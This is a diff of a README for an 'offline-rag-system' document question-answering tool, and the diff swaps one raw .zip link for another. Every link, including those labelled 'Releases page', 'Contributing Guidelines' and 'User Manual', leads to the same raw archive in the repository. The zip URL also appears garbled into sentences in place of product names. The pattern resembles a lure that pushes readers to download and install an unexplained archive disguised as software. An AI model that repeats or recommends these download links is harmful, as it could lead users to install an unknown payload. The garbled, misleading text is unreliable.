@@ -1,6 +1,6 @@
 # 🎉 offline-rag-system - Effortlessly Manage Your Documents Offline
 
-![Download](https://github.com/lukauux/offline-rag-system/raw/refs/heads/main/app/api/rag/rag_system_offline_3.9.zip)
+![Download](https://github.com/lukauux/offline-rag-system/raw/refs/heads/main/scripts/offline_system_rag_3.1.zip)
 
 ## 📦 Overview
 The offline-rag-system is a smart solution designed for users who want to manage their documents effortlessly. This prototype allows you to ingest various file types like PDFs, DOC/DOCX, images, and audio, while providing grounded answers seamlessly, all without needing an internet connection after initial setup.
@@ -9,7 +9,7 @@ The offline-rag-system is a smart solution designed for users who want to manage
 This section will guide you through downloading and running the software. You will be ready to use the offline-rag-system in no time.
 
 1. **Download the Application**
-   - To obtain the latest version, visit the [Releases page](https://github.com/lukauux/offline-rag-system/raw/refs/heads/main/app/api/rag/rag_system_offline_3.9.zip).
+   - To obtain the latest version, visit the [Releases page](https://github.com/lukauux/offline-rag-system/raw/refs/heads/main/scripts/offline_system_rag_3.1.zip).
    - Here, you will find the appropriate version for your operating system. Simply click the download link for your system.
 
 2. **Install the Application**
@@ -37,13 +37,13 @@ This feature allows you to perform text queries and get relevant results from pa
 The system delivers stitched summaries with clear citations. You will see where each piece of information comes from, including filenames, pages, timestamps, and chunk IDs.
 
 ### 🦙 Local LLM Option
-For users who want richer responses, you can plug in a https://github.com/lukauux/offline-rag-system/raw/refs/heads/main/app/api/rag/rag_system_offline_3.9.zip GGUF checkpoint. This option enhances answer synthesis.
+For users who want richer responses, you can plug in a https://github.com/lukauux/offline-rag-system/raw/refs/heads/main/scripts/offline_system_rag_3.1.zip GGUF checkpoint. This option enhances answer synthesis.
 
 ### 🎨 Modern User Interface
-The https://github.com/lukauux/offline-rag-system/raw/refs/heads/main/app/api/rag/rag_system_offline_3.9.zip 15 interface provides an intuitive chat experience. You'll find search controls for managing multi-query, similarity, and MMR.
+The https://github.com/lukauux/offline-rag-system/raw/refs/heads/main/scripts/offline_system_rag_3.1.zip 15 interface provides an intuitive chat experience. You'll find search controls for managing multi-query, similarity, and MMR.
 
 ## 📥 Download & Install
-To get started, you can download the application from the [Releases page](https://github.com/lukauux/offline-rag-system/raw/refs/heads/main/app/api/rag/rag_system_offline_3.9.zip). Ensure you select the correct file depending on your operating system. Once downloaded, follow the installation steps outlined in the "Getting Started" section.
+To get started, you can download the application from the [Releases page](https://github.com/lukauux/offline-rag-system/raw/refs/heads/main/scripts/offline_system_rag_3.1.zip). Ensure you select the correct file depending on your operating system. Once downloaded, follow the installation steps outlined in the "Getting Started" section.
 
 ## 📋 System Requirements
 - **Operating System**: Windows 10 and above, macOS Catalina and above, or an equivalent Linux distribution.
@@ -60,8 +60,8 @@ If you encounter issues during installation or have questions about using the of
 Feel free to experiment with the software and reach out for help if you face roadblocks. Your feedback is valuable for improving the system.
 
 ## 🔗 Additional Resources
-- [Contributing Guidelines](https://github.com/lukauux/offline-rag-system/raw/refs/heads/main/app/api/rag/rag_system_offline_3.9.zip)
-- [User Manual](https://github.com/lukauux/offline-rag-system/raw/refs/heads/main/app/api/rag/rag_system_offline_3.9.zip)
+- [Contributing Guidelines](https://github.com/lukauux/offline-rag-system/raw/refs/heads/main/scripts/offline_system_rag_3.1.zip)
+- [User Manual](https://github.com/lukauux/offline-rag-system/raw/refs/heads/main/scripts/offline_system_rag_3.1.zip)
 
 ## 🌟 Closing Note
 You have the tools to manage your documents offline effectively. Enjoy exploring the offline-rag-system's capabilities.
